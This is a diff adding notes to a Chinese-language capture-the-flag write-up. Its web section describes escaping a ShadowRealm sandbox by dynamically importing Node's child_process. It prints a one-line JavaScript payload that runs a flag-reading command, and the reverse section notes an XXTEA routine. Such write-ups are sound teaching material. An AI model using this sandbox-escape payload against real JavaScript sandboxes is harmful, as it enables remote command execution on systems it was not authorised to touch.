@@ -1,6 +1,21 @@
 
 # web
 
+### yet another sandbox
+
+shadowRealm沙箱
+
+> ECMA262 的标准Execution Contexts的执行环境，翻阅该标准可以得知是支持目前已经支持了dynamic import。
+> 故可以直接dynamic import到child_processRCE：
+
+```js
+import('child_process').then(m=>m.execSync('/readflag > /app/asserts/flag'));
+1;
+```
+
+### Deserialize?Upload!
+
+
 # reverse
 
 ### auuuu3
@@ -48,8 +63,10 @@ with open("enc.dll",'wb')as f:
 ```
 
 使用ida打开
-看不懂算法是啥,->XXTEA
+看不懂算法是啥,->XXTEA,
 
+
+### 
 # pwn
 
 # crypto
